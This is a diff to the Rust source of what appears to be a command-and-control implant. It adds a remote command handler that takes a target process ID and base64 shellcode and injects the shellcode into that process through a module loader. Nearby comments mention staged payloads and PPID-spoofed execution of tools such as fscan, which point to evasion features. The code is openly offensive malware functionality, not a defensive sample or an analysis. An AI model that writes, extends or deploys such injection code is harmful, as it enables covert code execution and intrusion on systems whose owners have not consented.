@@ -766,6 +766,45 @@ impl MessageHandler {
                 }
             }
 
+            // Process inject — L2 mod_inject only (never compiled into Stage0 defaults).
+            // Payload: command_content = JSON {pid,data,method,wait_ms}
+            //      or: content/path = pid, data = shellcode base64
+            #[cfg(feature = "module-loader")]
+            "process_inject" | "shellcode_inject" | "inject_shellcode" | "inject" => {
+                let ct = command_payload.command_type.as_str();
+                let content = command_payload.command_content.trim();
+                let body: Vec<u8> = if content.starts_with('{') {
+                    content.as_bytes().to_vec()
+                } else {
+                    let pid: u64 = content.parse().unwrap_or_else(|_| {
+                        command_payload
+                            .path
+                            .as_deref()
+                            .and_then(|p| p.parse().ok())
+                            .unwrap_or(0)
+                    });
+                    let data = command_payload.data.as_deref().unwrap_or("").trim();
+                    serde_json::to_vec(&serde_json::json!({
+                        "pid": pid,
+                        "data": data,
+                        "method": "auto",
+                        "wait_ms": 0,
+                    }))
+                    .unwrap_or_else(|_| br#"{"pid":0,"data":"","method":"auto"}"#.to_vec())
+                };
+                let mut r = match crate::module_loader::invoke_inject_json(ct, &body) {
+                    Ok(res) => res,
+                    Err(e) => CommandResult {
+                        stdout: String::new(),
+                        stderr: e,
+                        path: None,
+                        req_id: None,
+                    },
+                };
+                r.req_id = command_payload.req_id.clone();
+                r
+            }
+
             // Native PE tools (fscan etc.) — PPID-spoofed short process, not shell spawn
             #[cfg(feature = "isolated-exec")]
             "native_exec" => {
